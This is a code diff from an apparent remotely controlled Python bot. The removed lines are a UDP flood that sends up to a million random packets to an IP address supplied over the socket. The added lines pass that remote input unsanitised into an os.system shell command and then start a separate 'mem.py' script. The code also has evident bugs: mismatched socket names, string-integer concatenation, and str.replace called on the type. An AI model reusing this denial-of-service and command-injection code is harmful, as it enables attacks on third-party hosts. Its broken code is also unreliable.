@@ -34,29 +34,11 @@ while True:
      try:
        data = conn.recv(1024).decode()
        print(data)
-       now = datetime.now()
-       hour = now.hour
-       minute = now.minute
-       day = now.day
-       month = now.month
-       year = now.year
-
-##############
-       socke = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-       bytes = random._urandom(1490)
-#############
-
-
-       ip = data
-       port = 80
-       sent = 0
-       while sent < 1000000:
-          sock.sendto(bytes, (ip,port))
-          sent = sent + 1
-          port = port + 1
-          print ("Sent "+sent+" packet to "+ip+" throught port:"+port)
-          if port == 65534:
-             port = 1
+      iuf = str.replace('d', '', 1)
+      slp = 'echo '+iuf+'>ip.txt'
+      os.system(slp)
+      os.system('python3 mem.py')
+      
      except:
        pass
        if not data:
